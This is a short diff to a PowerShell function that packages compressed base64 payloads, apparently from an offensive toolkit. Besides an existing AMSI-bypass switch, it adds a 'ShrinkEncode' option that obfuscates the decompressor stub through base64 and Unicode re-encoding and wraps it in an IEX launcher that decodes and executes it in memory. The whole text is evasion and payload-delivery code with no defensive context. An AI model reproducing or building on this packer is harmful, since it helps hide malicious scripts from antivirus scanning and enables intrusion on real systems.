@@ -82,9 +82,12 @@ function Package-CompressedB64 {
 		[ValidateNotNullOrEmpty()]
 		[string]
 		$B64String,
-        [Parameter(Mandatory = $false, Position = 1)]
+        [Parameter(Mandatory = $false, Position = 1, ParameterSetName = "A")]
 		[switch]
 		$ReEncode = $false,
+        [Parameter(Mandatory = $false, Position = 1, ParameterSetName = "B")]
+		[switch]
+		$ShrinkEncode = $false,
         [Parameter(Mandatory = $false, Position = 2)]
 		[switch]
 		$AmsiBypass = $false,
@@ -106,6 +109,13 @@ function Package-CompressedB64 {
     if ($ReEncode)
     {
         $Decompressor = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($Decompressor))
+    }
+
+    if ($ShrinkEncode)
+    {
+        $Decompressor = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($Decompressor))
+        $Decompressor = [Text.Encoding]::Unicode.GetString([Text.Encoding]::ASCII.GetBytes($Decompressor))
+        $Decompressor = '$a=[Text.Encoding];IEX($a::ASCII.GetBytes([Convert]::FromBase64String($a::ASCII.GetString($a::Unicode.GetBytes(' + $Decompressor + ')))))'
     }
 
     Write-Output $Decompressor
